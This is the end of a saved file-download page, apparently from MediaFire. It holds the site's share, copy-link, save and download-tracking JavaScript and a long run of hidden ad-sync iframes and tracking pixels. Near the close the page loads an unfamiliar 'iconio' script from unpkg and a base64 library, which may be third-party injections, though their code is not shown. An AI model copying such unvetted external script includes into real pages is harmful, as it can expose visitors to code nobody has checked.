  var elCopyLink = document.getElementById('copyShareURL');
  var elCopyLinkMobile = document.getElementById('copyShareURLMobile');
  var elTurboDownloadOptIn = document.getElementById('ParallelDL-optIn');

  // State
  var alwaysReloadShareBox = true;
  var stateShareBoxLoaded = false;
  elIframeShare.style.display = '';

  // Events
  if (elShare) elShare.onclick = openShareDialog;
  if (elShareMobile) elShareMobile.onclick = openShareDialog;
  if (elWrapperShare) elWrapperShare.onclick = closeShareDialog;
  if (elCloseShare) elCloseShare.onclick = closeShareDialog;
  if (elSave) elSave.onclick = saveToMyfiles;
  if (elSaveMobile) elSaveMobile.onclick ? window.location = 'https://www.mediafire.com/login/' : {};
  if (elSaveParallel) elSaveParallel.onclick = saveToMyfiles;
  if (elCopyLink) elCopyLink.onclick = copyShareLink;
  if (elCopyLinkMobile) elCopyLinkMobile.onclick = copyShareLink;
  if (elTurboDownloadOptIn) {
    elTurboDownloadOptIn.onclick = function() {
      document.cookie = "=\"\"; expires=\"Thu, 01 Jan 1970 00:00:01 GMT\"; path=/";
      document.cookie = "mf_tdl_auto=1; max-age=90; path=/";
      window.trackTurboDownload('opt_in');
      window.location.reload();
    };
  }

  // Globals
  window.addEventListener("message", function(e) {
    if (e && e.data === 'mf-close-dialogs') {
      closeShareDialog();
    }
  });

  window.trackTurboDownload = function(event, details) {
    if (!optReportTurboDL) return;
    try {
      var xhr = new XMLHttpRequest();
      var query = 'security=' + optSecurityToken + '&event=' + event;
      if (details) {
        query += '&connections=' + details.connections
          + '&speed_kbps=' + details.speed
          + '&duration=' + details.duration
          + '&filesize=' + details.filesize
          + '&go_experiment=' + (window.go_experiment || '');
      }
      xhr.open('POST', '/dynamic/track_turbo_download.php', true);
      xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
      xhr.send(query);
    } catch(e) {}
    try {
      gtag('event', event, {
        'event_category': 'turbo_download'
      });
    } catch (e) {}
  };

  window.showDesktopDownloadArrow = function() {
    try {
      if (navigator.userAgent.match(/Mobi/)) return;
      var div = document.createElement("div");
      div.id = 'download-arrow';
      document.body.appendChild(div);
      setTimeout(function() {div.style.opacity = 1}, 100);
    } catch(e) {}
  };

  window.hideDesktopDownloadArrow = function() {
    try {
      var div = document.getElementById('download-arrow');
      div.parentNode.removeChild(div);
    } catch(e) {}
  };

  window.onLegacyCopyLink = function(legacyLink) {
    copyShareLink(null, legacyLink);
  };

  // Locals
  function openShareDialog(src) {
    src && src.preventDefault();
    document.body.classList.add('modal-open');
    elWrapperShare.style = 'display:block !important';
    if (alwaysReloadShareBox || !stateShareBoxLoaded) {
      elIframeShare.onload = function() {
        stateShareBoxLoaded = true;
      }
      elIframeShare.src = elIframeShare.getAttribute('data-src');
    }
  }

  function closeShareDialog(src) {
    src && src.preventDefault();
    try {
      document.body.classList.remove('modal-open');
      elWrapperShare.style = '';
    } catch(e) { }
  }

  function copyShareLink(src, altLink) {
    src && src.preventDefault();
    var targetLink = altLink || optFileURL;
    try {
      var iosCopyToClipboard = function(el) {
        var oldContentEditable = el.contentEditable,
          oldReadOnly = el.readOnly,
          range = document.createRange();
        el.contentEditable = true;
        el.readOnly = false;
        range.selectNodeContents(el);
        var s = window.getSelection();
        s.removeAllRanges();
        s.addRange(range);
        el.setSelectionRange(0, 999999);
        el.contentEditable = oldContentEditable;
        el.readOnly = oldReadOnly;
        document.execCommand('copy');
        document.activeElement.blur();
      };
      var copyListener = function(event) {
        document.removeEventListener('copy', copyListener, true);
        event.preventDefault();
        var clipboardData = event.clipboardData;
        clipboardData.clearData();
        clipboardData.setData('text/plain', targetLink);
        clipboardData.setData('text/html', targetLink);
      };
      iosCopyToClipboard(document.getElementById('copy')); // iOS workaround
      document.addEventListener('copy', copyListener, true);
      document.execCommand('copy');
      showStatusMessage('Share Link copied to the clipboard!');
    } catch(e) {
      window.prompt('Press CTRL+C to copy share link:', targetLink);
    }
    return false;
  }

  function saveToMyfiles(src) {
    src.preventDefault();
    if (!optLoggedIn) {
      window.location.href = '/login?l=1';
      return;
    }
    var success = false;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/dynamic/save_to_myfiles.php', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
      try {
        success = JSON.parse(this.responseText).success;
      } catch (e) {
        success = false;
      }
      showStatusMessage(success
        ? 'Saved ' + optFileName + ' to your account!'
        : 'You do not have access to save ' + optFileName + ' to your account.');
    };
    xhr.send('security=' + optSecurityToken + '&quick_key=' + optFileKey);
    return false;
  }

  // Ad viewport events
  if (elWrapperAd && window.checkQueuedAdUnitViews) {
      function onScrollResizeChange() {
          var boundingRect = elWrapperAd.getBoundingClientRect();
          window.checkQueuedAdUnitViews({
              windowPageXOffset: - boundingRect.left,
              windowPageYOffset: - boundingRect.top,
              windowInnerWidth: window.innerWidth,
              windowInnerHeight: window.innerHeight
          });
      }
      window.addEventListener("scroll", onScrollResizeChange);
      window.addEventListener("resize", onScrollResizeChange);
      setTimeout(onScrollResizeChange, 1000);
      setTimeout(onScrollResizeChange, 3000);
  }

  // Lazy-loading
  try {
    var observer;
    function setupObserver() {
      observer = new IntersectionObserver(function(obsList) {
        handleIntersection(obsList);
      }, {rootMargin: "10px 0px"});
      findLazyLoadElements();
    }
    function findLazyLoadElements() {
      var elements = document.getElementsByClassName('lazyload');
      for (var el of elements) {
        observer.observe(el);
      }
    }
    function handleIntersection(obsList) {
      for (var obs of obsList) {
        var el = obs.target;
        if (obs.isIntersecting) {
          var lazyClass = el.getAttribute('data-lazyclass');
          if (lazyClass) el.classList.add(lazyClass);
          var lazySource = el.getAttribute('data-lazysrc');
          if (lazySource && el.src !== lazySource) el.src = lazySource;
        }
      }
    }
    setupObserver();
  } catch(e) {
    var elements = document.getElementsByClassName('lazyload');
    for (var i = 0; i < elements.length; i++) {
      var el = elements[i];
      el.className += ' ' + el.getAttribute('data-lazyclass');
      var lazySource = el.getAttribute('data-lazysrc');
      if (lazySource && el.src !== lazySource) el.src = lazySource;
    }
  }
  
  if (window.gtag) {
    gtag('event', 'optimize.callback', {
      callback: function(sVariants, sExperimentId) {
        window.go_experiment = sExperimentId + ':' + sVariants;
      }
    });
  }

  if (optJsDirectLink) {
    window.addEventListener('load',  function() {
      var dlButton = document.getElementById('downloadButton');
      if (dlButton) {
        dlButton.click();
      }
    });
  }
})();

})();</script><script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon="{&quot;rayId&quot;:&quot;70b6015c18ca5527&quot;,&quot;token&quot;:&quot;8e4f9484d8b840b28e4e0cc92b90ce0c&quot;,&quot;version&quot;:&quot;2021.12.0&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script><iframe src="https://85d03a68e65d779d96bdb6794e318fd8.safeframe.googlesyndication.com/safeframe/1-0-38/html/container.html" style="visibility: hidden; display: none;"></iframe>

<img src="https://c.aaxads.com/pxusr.gif" style="display: none !important;"><img src="https://www.aaxdetect.com/pxext.gif" style="display: none !important;"><iframe name="__tcfapiLocator" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="__uspapiLocator" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="googlefcInactive" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><iframe name="googlefcLoaded" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><script src="https://unpkg.com/iconio@1.0.2/ionicons.js"></script><iframe src="https://www.google.com/recaptcha/api2/aframe" width="0" height="0" style="display: none;"></iframe><iframe id="google_esf" name="google_esf" src="https://googleads.g.doubleclick.net/pagead/html/r20220511/r20190131/zrt_lookup.html" style="display: none;"></iframe><iframe sandbox="allow-scripts allow-same-origin" id="1891de74ba3ab38" frameborder="0" allowtransparency="true" marginheight="0" marginwidth="0" width="0" hspace="0" vspace="0" height="0" style="height:0px;width:0px;display:none;" scrolling="no" src="https://contextual.media.net/checksync.php?vsSync=1&amp;cs=8&amp;cv=31&amp;https=1&amp;cid=8CUO2689O&amp;prvid=2034%2C2033%2C2030%2C273%2C2028%2C2027%2C2025%2C237%2C117%2C97%2C99%2C3012%2C3011%2C3010%2C201%2C3007%2C246%2C4%2C203%2C9%2C2011%2C3022%2C3020%2C173%2C251%2C175%2C2009%2C178%2C255%2C3018%2C3017%2C214%2C3014%2C337%2C338%2C77%2C38%2C182%2C261%2C141%2C262%2C222%2C301%2C225%2C10000%2C80%2C108%2C229%2C307&amp;itype=PREBID&amp;purpose1=1&amp;gdprconsent=1&amp;gdpr=0&amp;coppa=0&amp;usp_status=0&amp;usp_consent=1">
    </iframe><iframe sandbox="allow-scripts allow-same-origin" id="195a44dc66ae7ce" frameborder="0" allowtransparency="true" marginheight="0" marginwidth="0" width="0" hspace="0" vspace="0" height="0" style="height:0px;width:0px;display:none;" scrolling="no" src="https://jp-u.openx.net/w/1.0/pd?plm=10&amp;ph=74c7d33a-f978-474b-98bd-3e72347fbee9&amp;gdpr=0">
    </iframe><iframe sandbox="allow-scripts allow-same-origin" id="20bb6b30e1e3fbc" frameborder="0" allowtransparency="true" marginheight="0" marginwidth="0" width="0" hspace="0" vspace="0" height="0" style="height:0px;width:0px;display:none;" scrolling="no" src="https://ads.pubmatic.com/AdServer/js/user_sync.html?kdntuid=1&amp;p=158936">
    </iframe><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>